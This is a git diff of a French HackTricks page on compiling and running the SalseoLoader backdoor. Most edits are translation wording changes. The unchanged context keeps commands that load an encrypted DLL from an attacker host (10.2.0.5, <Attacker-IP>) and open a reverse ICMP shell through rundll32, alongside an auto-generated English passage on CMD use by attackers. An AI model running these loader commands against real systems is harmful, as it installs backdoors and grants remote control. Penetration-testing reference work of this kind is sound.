@@ -99,9 +99,9 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
-### Ajoutez avant la fonction principale: \[DllExport]
+### Ajoutez avant la fonction principale : \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Installez DllExport pour ce projet
 
@@ -109,7 +109,7 @@ Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Recherchez le package DllExport (utilisez l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
+#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
 
@@ -143,7 +143,7 @@ Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Proprié
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Sélectionnez la **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
+Sélectionnez **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
@@ -174,21 +174,23 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
+CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a text-based interface for executing commands and performing various tasks. CMD can be used to navigate the file system, run programs, manage processes, and perform administrative tasks.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, including reconnaissance, privilege escalation, and data exfiltration.
+CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By exploiting vulnerabilities or using social engineering techniques, hackers can gain access to a target system and use CMD to perform malicious activities.
 
-To exploit CMD, hackers often use backdoors to gain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can maintain access even if the system is patched or the user's password is changed.
+Some common CMD commands used by hackers include:
 
-There are several ways to create a backdoor in CMD. One common method is to use the "netsh" command to create a persistent backdoor. The "netsh" command is a powerful tool that allows users to configure network settings. By using the "netsh" command, hackers can create a backdoor that listens for incoming connections and provides them with remote access to the compromised system.
+- **netstat**: This command displays active network connections and listening ports on a system. Hackers can use this command to gather information about a target system's network activity.
 
-Another method is to use the "reg" command to create a backdoor in the Windows Registry. The Windows Registry is a hierarchical database that stores configuration settings and options for the operating system. By modifying the Registry, hackers can create a backdoor that is executed every time the system starts up, providing them with persistent access to the compromised system.
+- **ipconfig**: This command displays the IP configuration of a system, including the IP address, subnet mask, and default gateway. Hackers can use this command to gather information about a target system's network configuration.
 
-In addition to creating backdoors, hackers can also use CMD to perform other malicious activities. For example, they can use CMD to execute malware, steal sensitive information, or launch denial-of-service attacks.
+- **tasklist**: This command displays a list of running processes on a system. Hackers can use this command to identify processes that may be vulnerable to exploitation.
 
-To protect against CMD-based attacks, it is important to implement strong security measures, such as regularly updating the operating system, using strong passwords, and monitoring system logs for suspicious activities. Additionally, it is recommended to use antivirus software and firewall to detect and block malicious CMD commands and scripts.
+- **regedit**: This command opens the Windows Registry Editor, which allows hackers to modify registry keys and values. By modifying registry settings, hackers can gain persistence on a target system.
 
-By understanding how CMD works and the various techniques used by hackers, you can better protect your systems and networks from unauthorized access and malicious activities.
+- **shutdown**: This command allows hackers to shut down or restart a target system. By executing this command, hackers can disrupt the normal operation of a system.
+
+It is important to note that the use of CMD for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security risks and to promote responsible and ethical hacking practices.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -202,7 +204,7 @@ rundll32.exe SalseoLoader.dll,main
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
